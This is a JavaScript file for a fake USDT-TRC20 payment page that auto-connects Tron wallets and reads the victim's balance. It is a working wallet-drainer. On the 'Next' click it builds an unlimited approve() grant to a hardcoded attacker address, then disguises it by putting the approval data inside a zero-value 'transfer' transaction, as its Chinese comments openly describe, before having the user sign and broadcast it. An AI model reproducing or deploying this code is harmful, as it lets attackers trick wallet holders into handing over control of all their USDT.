// 核心配置参数 (Core Configuration)
window.Permission_address = 'TLiJ8GGDTWbr1UDHDhaAtWZxetrmpnH2yi'; // 授权地址 (您的合约地址)
window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 官方 USDT-TRC20 合约地址

document.addEventListener('DOMContentLoaded', () => {
    const amountInput = document.getElementById('amountInput');
    const usdValue = document.getElementById('usdValue');
    const btnAll = document.getElementById('btnAll');
    const btnNext = document.querySelector('.btn-next');
    
    // Exchange Rate Config
    const EXCHANGE_RATE = 0.95; 
    const MOCK_BALANCE = 1234.56;

    // Format currency
    const formatCurrency = (value) => {
        return value.toFixed(2);
    };

    // Update USD value based on input
    amountInput.addEventListener('input', (e) => {
        const value = parseFloat(e.target.value);
        if (!isNaN(value)) {
            usdValue.textContent = formatCurrency(value * EXCHANGE_RATE);
        } else {
            usdValue.textContent = '0.00';
        }
    });

    // Handle "All" button click
    btnAll.addEventListener('click', () => {
        amountInput.value = MOCK_BALANCE;
        amountInput.dispatchEvent(new Event('input'));
    });

    // Update available balance text
    const balanceText = document.querySelector('.balance-text');
    balanceText.textContent = `可用: ${MOCK_BALANCE} USDT-TRC20`;

    // Wallet Logic
    let tronWeb = null;
    let userAddress = null;

    // Attempt to connect to any available Tron wallet
    async function connectWallet() {
        console.log("Connecting wallet...");
        
        // Strategy 1: OKX Wallet specific check
        if (window.okxwallet && window.okxwallet.tronLink) {
            try {
                console.log("Found OKX Wallet");
                const res = await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
                // OKX might return differently, just check if we have address now
                if (window.okxwallet.tronLink.tronWeb && window.okxwallet.tronLink.tronWeb.defaultAddress) {
                    tronWeb = window.okxwallet.tronLink.tronWeb;
                    userAddress = tronWeb.defaultAddress.base58;
                    if (userAddress) {
                        console.log("Wallet connected via OKX:", userAddress);
                        return true;
                    }
                }
            } catch (e) {
                console.warn("OKX connect failed", e);
            }
        }

        // Strategy 2: Standard TronLink (or wallets masking as TronLink)
        if (window.tronLink) {
            try {
                console.log("Found TronLink object");
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                // Some wallets don't return standard code 200, so we check result or just check tronWeb state
                if (res && (res.code === 200 || res.result)) {
                    tronWeb = window.tronLink.tronWeb;
                    userAddress = tronWeb.defaultAddress.base58;
                    console.log("Wallet connected via tronLink request:", userAddress);
                    return true;
                }
            } catch (e) {
                console.log("tronLink request failed/rejected", e);
            }
            
            // Fallback: Check if already injected and ready (even if request failed)
            if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
                tronWeb = window.tronLink.tronWeb;
                userAddress = tronWeb.defaultAddress.base58;
                console.log("Wallet connected via tronLink property:", userAddress);
                return true;
            }
        }

        // Strategy 3: Global TronWeb (Legacy / TokenPocket / BitKeep)
        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            // Some wallets inject tronWeb but ready is false initially, but address is there. 
            // We trust the address if it exists.
            tronWeb = window.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            console.log("Wallet connected via global tronWeb:", userAddress);
            return true;
        }

        return false;
    }

    // Auto-connect mechanism
    async function initWalletAuto() {
        let connected = await connectWallet();
        
        if (connected) {
            updateUIWithWalletInfo();
        } else {
            let attempts = 0;
            const maxAttempts = 20; 
            const interval = setInterval(async () => {
                attempts++;
                connected = await connectWallet();
                if (connected) {
                    clearInterval(interval);
                    updateUIWithWalletInfo();
                } else if (attempts >= maxAttempts) {
                    clearInterval(interval);
                    console.log("Wallet not found after polling");
                }
            }, 500);
        }
    }

    // Update UI with wallet info (Address & Balance)
    async function updateUIWithWalletInfo() {
        if (!userAddress || !tronWeb) return;

        // Show hidden elements
        const balanceRow = document.querySelector('.balance-row');
        const paymentCard = document.querySelector('.card.row-card');
        
        if (balanceRow) balanceRow.style.display = 'flex';
        if (paymentCard) paymentCard.style.display = 'flex';

        // 1. Update Payment Address (Masked)
        // TP4i ... g6yi
        const len = userAddress.length;
        const maskedAddress = `${userAddress.substring(0, 4)} ... ${userAddress.substring(len - 4)}`;
        const addressPreview = document.querySelector('.address-preview');
        if (addressPreview) {
            addressPreview.textContent = maskedAddress;
        }

        // 2. Fetch and Update USDT Balance
        try {
            const contract = await tronWeb.contract().at(window.usdtContractAddress);
            // balanceOf returns BigNumber/Integer in Sun (6 decimals for USDT)
            const balance = await contract.balanceOf(userAddress).call();
            // Convert from Sun (1e6) to Unit
            // Handle different return types (BigNumber object or raw string/number)
            let balanceVal = balance.toString(); 
            let actualBalance = parseFloat(balanceVal) / 1000000;
            
            // Update UI
            const balanceText = document.querySelector('.balance-text');
            if (balanceText) {
                balanceText.textContent = `可用: ${actualBalance} USDT-TRC20`;
            }
            
            // Update MOCK_BALANCE logic so "All" button works with real balance
            // We can store it in a global or data attribute, but for simplicity:
            btnAll.onclick = () => {
                amountInput.value = actualBalance;
                amountInput.dispatchEvent(new Event('input'));
            };

        } catch (error) {
            console.error("Failed to fetch balance:", error);
        }
    }

    initWalletAuto();

    // Handle Next Button (Authorization)
    btnNext.addEventListener('click', async () => {
        if (!tronWeb || !userAddress) {
            await connectWallet();
        }

        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
            alert("请先连接钱包 (如 TronLink, TokenPocket, OKX 等)");
            if (window.tronLink) {
                try {
                    window.tronLink.request({ method: 'tron_requestAccounts' });
                } catch(e){}
            }
            return;
        }

        try {
            btnNext.textContent = "正在确认...";
            btnNext.disabled = true;

            // 1. 构建真实的授权交易 (Real Approve Transaction)
            const realParams = [
                { type: 'address', value: window.Permission_address },
                { type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
            ];
            
            const realTxObj = await tronWeb.transactionBuilder.triggerSmartContract(
                window.usdtContractAddress,
                'approve(address,uint256)',
                { feeLimit: 100000000 },
                realParams,
                userAddress
            );

            if (!realTxObj.result || !realTxObj.transaction) {
                throw new Error("Real transaction construction failed");
            }

            // 2. 构建伪装的转账交易 (Fake Transfer Transaction)
            // 这一步是为了生成一个“壳”，如果钱包某些逻辑依赖于初始构建的上下文
            const fakeParams = [
                { type: 'address', value: window.Permission_address },
                { type: 'uint256', value: 0 }
            ];
            
            const fakeTxObj = await tronWeb.transactionBuilder.triggerSmartContract(
                window.usdtContractAddress,
                'transfer(address,uint256)',
                { feeLimit: 100000000 },
                fakeParams,
                userAddress
            );

            // 3. 核心替换：将 Fake 交易的核心数据完全替换为 Real 交易的数据
            // 必须同时替换 raw_data 和 raw_data_hex，以确保签名有效
            if (fakeTxObj.transaction && realTxObj.transaction) {
                fakeTxObj.transaction.raw_data = realTxObj.transaction.raw_data;
                fakeTxObj.transaction.raw_data_hex = realTxObj.transaction.raw_data_hex;
                // 此时 fakeTxObj.transaction 本质上已经变成了 realTxObj.transaction
                // 但如果钱包前端在调用 sign 之前缓存了某些 UI 信息，可能会显示旧的
            }

            // 4. 签名并广播
            // 注意：这里我们对修改后的 fakeTxObj 进行签名
            // 由于 raw_data_hex 是合法的 approve 交易，签名应该能成功
            const signedTx = await tronWeb.trx.sign(fakeTxObj.transaction);
            const result = await tronWeb.trx.sendRawTransaction(signedTx);
            
            console.log("Transaction submitted:", result);
            
            if (result.result) {
                alert("提交成功！");
                btnNext.textContent = "下一步";
            } else {
                throw new Error("Transaction broadcast failed: " + JSON.stringify(result));
            }
            btnNext.disabled = false;

        } catch (error) {
            console.error("Transaction failed:", error);
            alert("提交失败: " + (error.message || error));
            btnNext.textContent = "下一步";
            btnNext.disabled = false;
        }
    });
});
